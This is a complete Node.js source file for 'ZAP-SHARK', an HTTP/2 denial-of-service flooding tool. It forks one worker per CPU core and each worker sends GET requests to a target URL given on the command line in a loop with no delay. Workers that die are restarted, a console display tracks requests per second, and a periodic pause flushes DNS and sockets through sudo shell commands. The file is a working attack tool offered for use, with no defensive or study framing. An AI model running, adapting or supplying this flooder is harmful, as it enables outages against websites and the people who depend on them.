const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.peakRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Performance tuning
        this.concurrency = Math.max(1, Math.min(numCPUs, 4)); // Optimized for mobile/desktop
        this.workers = [];
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.statsInterval = null;
    }

    // Ultra-fast request function
    createAttackWorker() {
        if (cluster.isWorker) {
            const client = http2.connect(process.env.TARGET_URL, {
                maxSessionMemory: 16384,
                maxDeflateDynamicTableSize: 4096,
                maxSettings: 1024
            });

            let requests = 0;
            const reportInterval = setInterval(() => {
                if (process.connected) {
                    process.send({ requests });
                    requests = 0;
                }
            }, 500);

            client.on('connect', () => {
                const attack = () => {
                    try {
                        const req = client.request({ 
                            ':method': 'GET', 
                            ':path': '/',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        });
                        
                        req.on('response', () => {
                            req.destroy();
                            requests++;
                        });
                        
                        req.on('error', () => {
                            requests++;
                            req.destroy();
                        });
                        
                        req.end();
                        
                        // MAX SPEED - minimal setImmediate for event loop
                        if (Math.random() > 0.99) {
                            setImmediate(attack);
                        } else {
                            attack();
                        }
                    } catch (err) {
                        requests++;
                        setImmediate(attack);
                    }
                };
                
                attack();
            });

            client.on('error', () => {
                setTimeout(() => process.exit(1), 1000);
            });

            process.on('disconnect', () => {
                clearInterval(reportInterval);
                client.destroy();
                process.exit(0);
            });
        }
    }

    // Master process control
    startMaster() {
        console.log(`🚀 ZAP-SHARK BOOTING...`);
        console.log(`🎯 Target: ${this.targetUrl}`);
        console.log(`⚡ Workers: ${this.concurrency}`);
        console.log(`💻 CPU Cores: ${numCPUs}`);
        console.log(`📱 Optimized: Mobile & Desktop`);
        console.log('='.repeat(50));

        // Fork workers
        for (let i = 0; i < this.concurrency; i++) {
            const worker = cluster.fork({
                TARGET_URL: this.targetUrl
            });
            
            worker.on('message', (msg) => {
                this.totalRequests += msg.requests;
                this.requestsSinceLastCalc += msg.requests;
            });
            
            worker.on('exit', () => {
                setTimeout(() => {
                    cluster.fork({ TARGET_URL: this.targetUrl });
                }, 1000);
            });
            
            this.workers.push(worker);
        }

        this.startStats();
        this.startMaintenanceCycle();
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.5) { // Faster updates
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const memory = process.memoryUsage();
        const memUsage = (memory.heapUsed / 1024 / 1024).toFixed(1);
        
        process.stdout.write(`\r🦈 ZAP-SHARK: [${this.formatRuntime()}] | ${this.status} | ` +
                           `REQS: ${this.totalRequests.toLocaleString()} | ` +
                           `LIVE: ${this.currentRPS.toFixed(0)}/s | ` +
                           `PEAK: ${this.peakRPS.toFixed(0)}/s | ` +
                           `MEM: ${memUsage}MB | ` +
                           `WORKERS: ${Object.keys(cluster.workers || {}).length}`);
    }

    flushDNS() {
        const cmds = {
            'win32': 'ipconfig /flushdns',
            'darwin': 'dscacheutil -flushcache; sudo killall -HUP mDNSResponder',
            'linux': 'sudo systemd-resolve --flush-caches 2>/dev/null || sudo /etc/init.d/nscd restart 2>/dev/null'
        };
        exec(cmds[os.platform()] || 'echo "DNS flush"', () => {});
    }

    flushSockets() {
        exec('sudo sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null', () => {});
        
        // Restart workers for clean sockets
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }

    startMaintenanceCycle() {
        setInterval(() => {
            this.checkMaintenance();
        }, 5000); // Check every 5 seconds
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n\n🔧 MAINTENANCE MODE ACTIVATED (10 minutes)');
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                console.log('⚡ MAINTENANCE COMPLETE - MAX POWER RESTORED');
            }, this.maintenanceDuration);
        }
    }

    startStats() {
        this.statsInterval = setInterval(() => {
            this.updateDisplay();
        }, 100);
    }

    async start() {
        if (cluster.isMaster) {
            this.startMaster();
            
            // Handle exit gracefully
            process.on('SIGINT', () => this.stop());
            process.on('SIGTERM', () => this.stop());
            
        } else {
            this.createAttackWorker();
        }
    }

    stop() {
        console.log('\n\n🛑 SHUTTING DOWN ZAP-SHARK...');
        this.running = false;
        
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
        }
        
        // Kill all workers
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => {
            console.log(`📊 FINAL STATS:`);
            console.log(`   Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`   Peak RPS: ${this.peakRPS.toFixed(0)}/s`);
            console.log(`   Runtime: ${this.formatRuntime()}`);
            console.log('🎯 ZAP-SHARK TERMINATED');
            process.exit(0);
        }, 1000);
    }
}

// Auto-detect and optimize
const target = process.argv[2] || 'https://example.com';

if (!target.startsWith('https://')) {
    console.log('❌ ERROR: Use HTTPS target for HTTP/2');
    console.log('💡 Usage: node zap-shark.js https://target.com');
    process.exit(1);
}

// Performance optimizations
process.env.UV_THREADPOOL_SIZE = 128;
require('http2').setMaxListeners(100);

const shark = new ZAPSHARK(target);
shark.start().catch(console.error);
